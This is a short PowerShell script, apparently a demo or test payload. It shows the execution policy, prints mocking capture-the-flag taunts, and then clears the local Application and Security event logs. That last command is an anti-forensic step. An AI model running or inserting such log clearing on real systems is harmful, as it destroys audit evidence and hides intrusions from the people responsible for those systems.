Write-Host " My execution policy was: "
Get-ExecutionPolicy
Start-Sleep 3
Write-Host " My voice is my passport, verify me "
Write-Host "  LOL U LOSE"
Write-Host " What, I exceeded restrictions? "
Write-Host "   LOL U LOSE"
Write-Host " My voice is my passport, verify me "
Write-Host "    LOL U LOSE"
Start-Sleep 3
Write-Host " My voice is my passport, verify me "
Write-Host "     LOL U LOSE"
Write-Host " I'm in your base, stealin' your flag "
Write-Host "      LOL U LOSE"
Write-Host " My voice is my passport, verify me "
Write-Host "       LOL U LOSE"
Start-Sleep 2
Write-Host " (Attempt to clear Security and Application Event Log) "
Start-Sleep 1
Get-EventLog -list
Clear-EventLog -logname Application, Security -computername $env:COMPUTERNAME
